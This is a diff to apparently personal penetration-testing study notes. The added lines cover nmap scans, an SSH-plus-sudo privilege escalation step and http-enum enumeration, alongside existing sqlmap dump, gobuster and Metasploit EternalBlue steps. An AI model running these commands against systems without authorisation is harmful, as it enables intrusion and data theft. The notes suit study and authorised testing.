@@ -102,12 +102,15 @@ nmap -p 25 subnet --open -T5
 
 SMB enumeration (check message signing):
 nmap -p 445 192.168.0.X -sC -T5
-
+# priviledge escalation
+-nmap -sV -p 22 subnet(if ssh is open) or check telnet for priviledge escalation
+-ssh username@ip
+-sudo -i
+cd/
+find . -name file.txt
 
 #File & Hash Extraction
-
 Decrypt hash using:
-
 https://hashes.com/en/decrypt/hash or https://crackstation.net
 #Steganography
 # Steganography & Hidden Data
@@ -238,6 +241,8 @@ OR
 OR
 sqlmap -u "http://example.com/?id=4" --dump
 OR JSQL injection tool (url with parameter ID)
+OR page enumeration
+-nmap -sV --script=http-enum ipaddress
 #Dir busting- find directories and pages of a website.
 Vhost enumeration: find subdomains of a website.
 Dir busting-
@@ -250,7 +255,7 @@ Vhost enumeration
 Gobuster vhost –u http://IP –w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –append-domain
 #System Hacking
 Metasploit
-Step 1: scan the target: nmap –A –sC 192.168.1.2
+Step 1: scan the target: nmap –A –sC IP
 Step 2: sudo msfconsole
 Step 3: Search for the Eternal Blue exploit( if port 445 is open)(by writing serach eternal.
              :use exploit/windows/smb/ms17_010_psexec
